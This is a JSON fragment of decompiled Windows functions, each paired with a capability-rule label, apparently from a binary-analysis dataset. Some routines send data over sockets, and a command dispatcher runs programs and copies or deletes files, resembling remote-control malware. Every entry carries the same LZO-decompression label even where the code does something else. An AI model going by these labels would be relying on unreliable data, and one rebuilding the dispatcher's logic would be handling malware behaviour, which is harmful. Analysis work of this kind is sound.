    "0046be34": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046be34(uint param_1)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    \n    uVar1 = fcn.0040aaac(param_1);\n    sub.kernel32.dll_GetSystemDirectoryA(uVar1, 0x104);\n    fcn.00405728();\n    iVar2 = *in_EAX;\n    if (iVar2 != 0) {\n        iVar2 = *(iVar2 + -4);\n    }\n    if (*(*in_EAX + -1 + iVar2) != '\\\\') {\n        fcn.00405818();\n    }\n    fcn.0040aaf8();\n    return;\n}\n",
        "token_count": 156
    },
    "0046d960": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0046da53)\n\nvoid __fastcall fcn.0046d960(uint param_1, uint *param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *in_FS_OFFSET;\n    uchar uVar4;\n    uint *puStack80;\n    uint uStack76;\n    uchar *puStack72;\n    int32_t iStack68;\n    uint uStack64;\n    uchar *puStack60;\n    int32_t iStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack60 = &stack0xfffffffc;\n    var_8h = 0;\n    puStack48 = 0x46d97d;\n    fcn.004059cc();\n    uStack52 = 0x46dad7;\n    iStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    uStack64 = 0x46da9d;\n    iStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    puStack72 = 0x46d9a5;\n    puStack48 = &stack0xfffffffc;\n    piVar1 = fcn.00404620();\n    uStack76 = 0x46da8c;\n    puStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    puStack72 = &stack0xfffffffc;\n    (**(*piVar1 + 0x2c))();\n    iVar2 = (**(*piVar1 + 0x14))();\n    if (-1 < iVar2 + -1) {\n        do {\n            (**(*piVar1 + 0xc))();\n            puStack80 = &fcn.0046d960::var_8h;\n            iVar3 = fcn.00405b28();\n            uVar4 = iVar3 == 1;\n            fcn.00405a44();\n            fcn.00409b6c();\n            fcn.00409b6c(0);\n            fcn.00405974();\n            if (uVar4) {\n                fcn.00405b28();\n                fcn.00405a84();\n                puStack80 = param_2;\n                fcn.00405a44();\n                break;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    *in_FS_OFFSET = puStack80;\n    puStack72 = 0x46da93;\n    uStack76 = 0x46da8b;\n    fcn.00404650();\n    return;\n}\n",
        "token_count": 637
    },
    "0046daf4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid __fastcall fcn.0046daf4(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint var_30h;\n    uint *var_2ch;\n    uint32_t var_28h;\n    uchar *var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uchar *var_18h;\n    uint var_14h;\n    int32_t *var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    iVar2 = 6;\n    do {\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    var_18h = 0x46db14;\n    var_ch = param_2;\n    fcn.004059cc();\n    var_1ch = 0x46dc8e;\n    var_20h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0046daf4::var_20h;\n    var_24h = 0x46db2a;\n    var_18h = &stack0xfffffffc;\n    fcn.00405530();\n    var_24h = 0x46db32;\n    cVar1 = fcn.0040a25c();\n    if (cVar1 != '\\0') {\n        var_24h = 0x46db45;\n        fcn.004890f8();\n        if (var_8h != 0) {\n            var_8h = *(var_8h + -4);\n        }\n        if (0 < var_8h) {\n            var_24h = 0x46db65;\n            var_10h = fcn.00404620();\n            var_28h = 0x46dc5f;\n            var_2ch = *in_FS_OFFSET;\n            *in_FS_OFFSET = &fcn.0046daf4::var_2ch;\n            var_24h = &stack0xfffffffc;\n            (**(*var_10h + 0x2c))();\n            iVar2 = (**(*var_10h + 0x14))();\n            if (-1 < iVar2 + -1) {\n                do {\n                    (**(*var_10h + 0xc))();\n                    cVar1 = fcn.00488080();\n                    if (cVar1 != '\\0') {\n                        (**(*var_10h + 0x20))();\n                    }\n                    iVar2 = iVar2 + -1;\n                } while (iVar2 != 0);\n            }\n            (**(*var_10h + 0x1c))();\n            fcn.00409b6c();\n            (**(*var_10h + 0x2c))();\n            *in_FS_OFFSET = var_2ch;\n            var_24h = 0x46dc66;\n            var_28h = *0x46dca8;\n            var_2ch = &fcn.0046daf4::var_20h;\n            (**(*var_10h + 0x1c))();\n            fcn.0040ef34(var_2ch, var_28h);\n            (**(*var_10h + 0x2c))();\n            (**(*var_10h + 0x1c))();\n            fcn.0048a574(var_28h);\n            fcn.00405864();\n            fcn.00461610();\n            fcn.00404650();\n            return;\n        }\n    }\n    *in_FS_OFFSET = var_20h;\n    var_18h = 0x46dc95;\n    var_1ch = 0x46dc80;\n    fcn.00405554();\n    var_1ch = 0x46dc8d;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 944
    },
    "0046dcf0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0046dcf0(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    uchar uVar3;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    uStack28 = 0x46dd9f;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack32;\n    fcn.00405c6c();\n    iVar2 = var_4h;\n    if (var_4h != 0) {\n        iVar2 = *(var_4h + -4);\n    }\n    uVar1 = fcn.004059dc(iVar2);\n    sub.kernel32.dll_GetWindowsDirectoryA(uVar1);\n    fcn.00405c6c();\n    uVar3 = var_4h == 0 || var_4h == 4;\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar3) {\n        fcn.00405584();\n    }\n    else {\n        fcn.00405864();\n    }\n    *in_FS_OFFSET = &var_8h;\n    fcn.00405554(0x46dda6);\n    return;\n}\n",
        "token_count": 325
    },
    "004741c8": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.004741c8(void)\n\n{\n    int32_t in_EAX;\n    \n    fcn.00405530();\n    if (in_EAX < 4) {\n        if (in_EAX == 3) {\n            fcn.00405584();\n            return;\n        }\n        if (in_EAX == -0x80000000) {\n            fcn.00405584();\n            return;\n        }\n        if (in_EAX == -1) {\n            fcn.00405584();\n        }\n        else {\n            if (in_EAX == 1) {\n                fcn.00405584();\n                return;\n            }\n            if (in_EAX == 2) {\n                fcn.00405584();\n                return;\n            }\n        }\n    }\n    else {\n        if (in_EAX == 4) {\n            fcn.00405584();\n            return;\n        }\n        if (in_EAX == 5) {\n            fcn.00405584();\n            return;\n        }\n        if (in_EAX == 6) {\n            fcn.00405584();\n            return;\n        }\n        if (in_EAX == 7) {\n            fcn.00405584();\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 273
    },
    "00474344": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.00474344(void)\n\n{\n    int32_t in_EAX;\n    \n    fcn.00405530();\n    if (in_EAX < 3) {\n        if (in_EAX == 2) {\n            fcn.00405584();\n            return;\n        }\n        if (in_EAX == -0x80000000) {\n            fcn.00405584();\n            return;\n        }\n        if (in_EAX == -1) {\n            fcn.00405584();\n        }\n        else {\n            if (in_EAX == 0) {\n                fcn.00405584();\n                return;\n            }\n            if (in_EAX == 1) {\n                fcn.00405584();\n                return;\n            }\n        }\n    }\n    else {\n        if (in_EAX == 4) {\n            fcn.00405584();\n            return;\n        }\n        if (in_EAX == 5) {\n            fcn.00405584();\n            return;\n        }\n        if (in_EAX == 0x100) {\n            fcn.00405584();\n            return;\n        }\n        if (in_EAX == 0x101) {\n            fcn.00405584();\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 276
    },
    "004744c4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.004744c4(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack104;\n    uint uStack100;\n    uint *arg_8h;\n    int32_t iStack92;\n    uint uStack88;\n    uchar *puStack84;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    int32_t *var_28h;\n    int32_t var_24h;\n    int32_t *var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack84 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    var_ch = 0;\n    var_10h = 0;\n    uStack88 = 0x474896;\n    iStack92 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa4;\n    cVar1 = fcn.00474094();\n    if (cVar1 != '\\0') {\n        uStack100 = 0x47485f;\n        iStack104 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff98;\n        fcn.00405530();\n        fcn.00405530();\n        fcn.00405530();\n        iVar2 = (***0x49266c)(1, 0, &fcn.004744c4::var_1ch, &fcn.004744c4::var_18h);\n        if (iVar2 == 0) {\n            uStack100 = 0;\n            iStack104 = var_18h;\n            iVar2 = (***0x492434)();\n            if (iVar2 == 0) {\n                var_2ch = *var_20h;\n                if (-1 < var_2ch + -1) {\n                    var_24h = 0;\n                    do {\n                        uStack100 = 0x4745a3;\n                        fcn.004057b8();\n                        uStack100 = 0;\n                        iStack104 = 0x4748ac;\n                        fcn.004058e0();\n                        fcn.00409790(var_10h);\n                        fcn.004058e0(0x4748b8, 0);\n                        iVar2 = (***0x492638)(var_18h, var_20h + var_20h[1] * 0x85 + 2, 1, 0, &fcn.004744c4::var_28h);\n                        if (iVar2 != 0) {\n                            fcn.00404f70();\n                            goto code_r0x00474866;\n                        }\n                        iVar2 = *var_28h;\n                        if (-1 < iVar2 + -1) {\n                            do {\n                                arg_8h = &fcn.004744c4::var_8h;\n                                uStack100 = 0x47463e;\n                                fcn.0040642c();\n                                uStack100 = 0x474657;\n                                fcn.0040af88(arg_8h);\n                                iVar3 = var_8h;\n                                if (var_8h != 0) {\n                                    iVar3 = *(var_8h + -4);\n                                }\n                                if (iVar3 < 1) {\n                                    uStack100 = 0x474674;\n                                    fcn.004055c8();\n                                }\n                                uStack100 = var_ch;\n                                iStack104 = var_8h;\n                                fcn.004058e0(0x4748ac);\n                                fcn.00405728();\n                                fcn.0040af88(&fcn.004744c4::var_8h);\n                                iVar3 = var_8h;\n                                if (var_8h != 0) {\n                                    iVar3 = *(var_8h + -4);\n                                }\n                                if (iVar3 < 1) {\n                                    fcn.004055c8();\n                                }\n                                fcn.004058e0(0x4748ac, var_8h, var_ch);\n                                fcn.0040af88(&fcn.004744c4::var_8h);\n                                iVar3 = var_8h;\n                                if (var_8h != 0) {\n                                    iVar3 = *(var_8h + -4);\n                                }\n                                if (iVar3 < 1) {\n                                    fcn.004055c8();\n                                }\n                                fcn.004058e0(0x4748ac, 0x4748e8, var_8h, var_ch);\n                                fcn.004741c8();\n                                fcn.0040af88(&fcn.004744c4::var_8h);\n                                iVar3 = var_8h;\n                                if (var_8h != 0) {\n                                    iVar3 = *(var_8h + -4);\n                                }\n                                if (iVar3 < 1) {\n                                    fcn.00405530();\n                                }\n                                fcn.004058e0(0x4748ac, var_8h, var_ch);\n                                fcn.00474344();\n                                fcn.0040af88(&fcn.004744c4::var_8h);\n                                iVar3 = var_8h;\n                                if (var_8h != 0) {\n                                    iVar3 = *(var_8h + -4);\n                                }\n                                if (iVar3 < 1) {\n                                    fcn.00405530();\n                                }\n                                iStack92 = 0x4748b8;\n                                fcn.004058e0();\n                                iVar2 = iVar2 + -1;\n                            } while (iVar2 != 0);\n                        }\n                        var_24h = var_24h + 1;\n                        var_2ch = var_2ch + -1;\n                    } while (var_2ch != 0);\n                }\n                uStack100 = 0x4748f4;\n                iStack104 = 0x4748b8;\n                fcn.004058e0(var_10h);\n                (***0x4927a8)(var_18h, 0);\n                *in_FS_OFFSET = var_18h;\n                fcn.004741b0(0x474866);\n                return;\n            }\n            fcn.00404f70();\n        }\n        else {\n            fcn.00404f70();\n        }\n    }\ncode_r0x00474866:\n    *in_FS_OFFSET = iStack92;\n    puStack84 = 0x47489d;\n    uStack88 = 0x47487b;\n    fcn.00405530();\n    uStack88 = 0x474888;\n    fcn.00405554();\n    uStack88 = 0x474895;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 1562
    },
    "00474d1c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.00474d1c(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = 0x474d34;\n    fcn.004059cc();\n    uStack28 = 0x474dad;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    fcn.00461334();\n    fcn.004055c8();\n    fcn.004055c8();\n    if (in_EAX != 0) {\n        in_EAX = *(in_EAX + -4);\n    }\n    uVar1 = fcn.00405a3c(in_EAX, 0);\n    uVar2 = **0x4925a8;\n    sub.wsock32.dll_send(uVar2, uVar1);\n    *in_FS_OFFSET = uVar2;\n    fcn.00405554(0x474db4);\n    return;\n}\n",
        "token_count": 267
    },
    "00474dbc": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00474dbc(uint param_1, int32_t param_2)\n\n{\n    uint in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = 0x474dd6;\n    fcn.004059cc();\n    uStack28 = 0x474e48;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    fcn.00461334();\n    fcn.004055c8();\n    fcn.004055c8();\n    if (param_2 != 0) {\n        param_2 = *(param_2 + -4);\n    }\n    fcn.00405a3c(param_2, 0);\n    sub.wsock32.dll_send();\n    *in_FS_OFFSET = in_EAX;\n    fcn.00405554(0x474e4f);\n    return;\n}\n",
        "token_count": 241
    },
    "00474e58": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00474e58(uint param_1, int32_t param_2)\n\n{\n    uint in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = 0x474e6b;\n    fcn.004059cc();\n    uStack24 = 0x474eba;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    fcn.004055c8();\n    if (param_2 != 0) {\n        param_2 = *(param_2 + -4);\n    }\n    fcn.00405a3c(param_2, 0);\n    sub.wsock32.dll_send();\n    *in_FS_OFFSET = in_EAX;\n    fcn.00405530(0x474ec1);\n    return;\n}\n",
        "token_count": 217
    },
    "0047df50": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid fcn.0047df50(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    int32_t unaff_EBX;\n    int32_t unaff_ESI;\n    uint *in_FS_OFFSET;\n    uchar uVar3;\n    ulong uVar4;\n    uint in_stack_ffffffc0;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uchar *var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_18h = &stack0xfffffffc;\n    var_ch = 4;\n    do {\n        var_4h = 0;\n        var_ch = var_ch + -1;\n    } while (var_ch != 0);\n    var_1ch = 0x47e1e3;\n    var_20h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0047df50::var_20h;\n    var_14h = unaff_ESI;\n    var_10h = unaff_EBX;\n    uVar4 = fcn.00488784();\n    iVar2 = uVar4 >> 0x20;\n    uVar3 = iVar2 == *(in_EAX + 0x54);\n    if (uVar3) {\n        uVar3 = uVar4 == *(in_EAX + 0x50);\n        if (uVar4 < *(in_EAX + 0x50)) goto code_r0x0047e1bb;\n    }\n    else if (iVar2 < *(in_EAX + 0x54)) goto code_r0x0047e1bb;\n    fcn.00405974();\n    if (uVar3) {\n        uVar1 = fcn.004059dc(0, 0, 5);\n        in_stack_ffffffc0 = 0x47dfb9;\n        sub.shell32.dll_ShellExecuteA(0, 0x47e204, uVar1);\n    }\n    else {\n        fcn.00405a44(&fcn.0047df50::var_8h);\n        fcn.00405974();\n        if (uVar3) {\n            fcn.00405a84();\n            fcn.004055c8();\n            fcn.00405974();\n            if (uVar3) {\n                uVar1 = fcn.004059dc(0, 0, 0);\n                in_stack_ffffffc0 = 0;\n                sub.shell32.dll_ShellExecuteA(0, 0x47e204, uVar1);\n            }\n            else {\n                uVar1 = fcn.004059dc(0, 0, 5);\n                in_stack_ffffffc0 = 0;\n                sub.shell32.dll_ShellExecuteA(0, 0x47e204, uVar1);\n            }\n        }\n        else {\n            fcn.00405974();\n            if (uVar3) {\n                uVar1 = fcn.004059dc(0, 0, 0);\n                in_stack_ffffffc0 = 0;\n                sub.shell32.dll_ShellExecuteA(0, 0x47e204, uVar1);\n                fcn.004748f8();\n            }\n            else {\n                fcn.00405974();\n                if (uVar3) {\n                    fcn.004882c0(0x80);\n                    fcn.00405818();\n                    uVar1 = fcn.004059dc();\n                    sub.kernel32.dll_SetFileAttributesA(uVar1);\n                    fcn.004882c0();\n                    fcn.00405818();\n                    var_14h = var_10h;\n                    uVar1 = fcn.004059dc();\n                    sub.kernel32.dll_DeleteFileA(uVar1);\n                    fcn.004882c0(0);\n                    fcn.00405818();\n                    uVar1 = fcn.004059dc();\n                    in_stack_ffffffc0 = fcn.004059dc(uVar1);\n                    sub.kernel32.dll_CopyFileA();\n                }\n                else {\n                    fcn.00405974();\n                    if (uVar3) {\n                        uVar1 = fcn.004059dc(0, 1);\n                        sub.winmm.dll_PlaySoundA(uVar1);\n                    }\n                    else {\n                        fcn.00405974();\n                        if (uVar3) {\n                            var_14h = **0x492338;\n                            iVar2 = var_14h;\n                            if (var_14h != 0) {\n                                iVar2 = *(var_14h + -4);\n                            }\n                            if (0 < iVar2) {\n                                fcn.0040a590(0);\n                                fcn.0046d960(var_20h);\n                                fcn.004058e0(0x47e29c, &fcn.0047df50::var_8h);\n                                uVar1 = fcn.004059dc();\n                                in_stack_ffffffc0 = fcn.004059dc(uVar1);\n                                sub.kernel32.dll_CopyFileA();\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }\ncode_r0x0047e1bb:\n    *in_FS_OFFSET = in_stack_ffffffc0;\n    fcn.00405554(0x47e1ea);\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 1253
    },
    "0047f828": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0047f828(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = 0x47f83b;\n    fcn.004059cc();\n    uStack24 = 0x47f89b;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    piVar1 = fcn.00404620();\n    *(in_EAX + 0x40) = piVar1;\n    (**(*piVar1 + 0x44))();\n    if (param_2 != 0) {\n        param_2 = *(param_2 + -4);\n    }\n    if (param_2 < 1) {\n        *(in_EAX + 0x48) = 0xffffffff;\n    }\n    else {\n        (**(**(in_EAX + 0x40) + 0x2c))();\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x47f8a2;\n    uStack24 = 0x47f89a;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 314
    },
    "0047fdd8": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0047fe35)\n// WARNING: Removing unreachable block (ram,0x0047fe60)\n// WARNING: Removing unreachable block (ram,0x0047fe3d)\n// WARNING: Removing unreachable block (ram,0x0047fe68)\n\nvoid fcn.0047fdd8(void)\n\n{\n    uint *in_FS_OFFSET;\n    float10 fVar1;\n    uint uVar2;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_18h;\n    uint var_14h;\n    uint var_eh;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    uStack44 = 0x47fee3;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack48;\n    fVar1 = fcn.0040bce8();\n    fcn.0040bbd0(SUB84(fVar1, 0), fVar1 >> 0x20);\n    fVar1 = fcn.0040bce8();\n    fcn.0040bc60(SUB84(fVar1, 0), fVar1 >> 0x20);\n    fcn.00409d60();\n    fcn.00409d60();\n    fcn.00409d60();\n    fcn.00409d60(0x47ff04, 0, 0x47ff04, 0, 0x47ff04, 0);\n    uVar2 = 0x47ff10;\n    fcn.004058e0(0x47ff10, 0);\n    *in_FS_OFFSET = uVar2;\n    fcn.00405554(0x47feea);\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 403
    },
    "0048043c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0048043c(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint *in_FS_OFFSET;\n    uchar uVar4;\n    float10 fVar5;\n    ulong uVar6;\n    uint in_stack_ffffff44;\n    uint in_stack_ffffff50;\n    int32_t iVar7;\n    uint uStack152;\n    uint uStack148;\n    uchar *puStack144;\n    uint uStack140;\n    uint uStack136;\n    uint uStack132;\n    uint uStack128;\n    uint uStack124;\n    uint uStack120;\n    uint uStack116;\n    uint uStack112;\n    uint uStack108;\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uchar *puStack28;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar2 = 0xb;\n    do {\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    puStack28 = 0x480459;\n    var_14h = unaff_EDI;\n    var_10h = unaff_ESI;\n    fcn.004059cc();\n    _var_20h = CONCAT44(0x48074b, *in_FS_OFFSET);\n    *in_FS_OFFSET = &fcn.0048043c::var_20h;\n    _var_28h = CONCAT44(&stack0xfffffffc, 0x48070f);\n    var_2ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0048043c::var_2ch;\n    uVar4 = **0x4923ac == 1;\n    if (!uVar4) {\n        var_30h = 0;\n    // WARNING: Subroutine does not return\n        var_34h = 0x480486;\n        puStack28 = &stack0xfffffffc;\n        sub.kernel32.dll_ExitThread_1();\n    }\n    var_30h = 0x48048e;\n    puStack28 = &stack0xfffffffc;\n    fcn.00480040();\n    var_30h = 0x48049c;\n    fcn.00405974();\n    if (uVar4) goto code_r0x004806e7;\n    var_30h = 0x4804af;\n    fcn.00489414();\n    var_34h = 0x480764;\n    var_38h = 0x4804bf;\n    fcn.0047fdd8();\n    var_38h = var_34h;\n    var_3ch = 0x4804cf;\n    fcn.004058e0();\n    var_3ch = 0x4804d7;\n    cVar1 = fcn.0040a25c();\n    uVar4 = cVar1 == '\\0';\n    if (uVar4) {\n        var_3ch = 0x4804f6;\n        fcn.00403500();\n        var_3ch = 0x4804fb;\n        fcn.0040305c();\n    }\n    else {\n        var_3ch = 0x4804e5;\n        fcn.0040350c();\n        var_3ch = 0x4804ea;\n        fcn.0040305c();\n    }\n    var_3ch = 0x480500;\n    fVar5 = fcn.0040bcb4();\n    _var_20h = fVar5;\n    var_1ch = _var_20h >> 0x20;\n    var_3ch = var_1ch;\n    var_40h = var_20h;\n    var_44h = 0x48051a;\n    fcn.0040c8e8();\n    var_44h = 0x480774;\n    var_48h = *0x49222c;\n    var_4ch = 0x480780;\n    var_50h = var_10h;\n    var_54h = 0x48078c;\n    var_58h = 0x480798;\n    uStack96 = *0x492234;\n    uStack100 = 0x480798;\n    uStack104 = 0x48054f;\n    fcn.004058e0();\n    uStack104 = 0x48055c;\n    fcn.00405cd0();\n    uStack104 = 0x480561;\n    fcn.004040ac();\n    uStack104 = 0x480566;\n    fcn.0040305c();\n    uStack104 = 0x48056e;\n    fcn.00480180();\n    uStack104 = 0x48057c;\n    fcn.00405974();\n    if (!uVar4) {\n        var_3ch = *0x49223c;\n        uStack104 = 0x48059b;\n        fVar5 = fcn.0040bcb4();\n        _var_28h = fVar5;\n        var_24h = _var_28h >> 0x20;\n        uStack104 = var_24h;\n        uStack108 = var_28h;\n        uStack112 = 0x4805b5;\n        fcn.0040c8e8();\n        uStack112 = 0x4807a4;\n        uStack116 = 0x4805c4;\n        fcn.00409d60();\n        uStack116 = var_44h;\n        uStack120 = 0x4807cc;\n        uStack124 = var_14h;\n        uStack128 = 0x48078c;\n        uStack132 = 0x480798;\n        uStack136 = *0x49223c;\n        uStack140 = 0x480798;\n        puStack144 = 0x4805f1;\n        fcn.004058e0();\n        puStack144 = 0x4805fe;\n        fcn.00405cd0();\n        puStack144 = 0x480603;\n        fcn.004040ac();\n        puStack144 = 0x480608;\n        fcn.0040305c();\n        puStack144 = 0x480615;\n        fcn.00405584();\n        uVar4 = 1;\n        uStack148 = 0x4806c4;\n        uStack152 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff68;\n        puStack144 = &stack0xfffffffc;\n        fcn.0046d960();\n        fcn.00405974();\n        if (uVar4) {\n            fcn.00489414();\n            fcn.0047fdd8(0x480764, var_50h);\n            fcn.004058e0(var_54h);\n            uVar6 = fcn.004800bc();\n            fcn.0046d960();\n            in_stack_ffffff50 = 0x48068b;\n            iVar2 = fcn.00409ecc();\n            iVar7 = uVar6 >> 0x20;\n            iVar3 = (iVar2 << 10) >> 0x1f;\n            if (iVar3 == iVar7) {\n                if (iVar2 << 10 < uVar6) {\ncode_r0x004806a2:\n                    in_stack_ffffff50 = 0;\n                    in_stack_ffffff44 = 0;\n                    sub.kernel32.dll_CreateThread_1(0, 0, fcn.004801a4, 0, 0, *0x4926e4);\n                }\n            }\n            else if (iVar3 < iVar7) goto code_r0x004806a2;\n        }\n        *in_FS_OFFSET = in_stack_ffffff44;\n    }\n    fcn.00403918();\n    fcn.0040305c();\n    fcn.00405530();\ncode_r0x004806e7:\n    fcn.00405818();\n    *in_FS_OFFSET = in_stack_ffffff50;\n    fcn.00405584(0x480716);\n    return;\n}\n",
        "token_count": 1987
    },
    "00481218": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
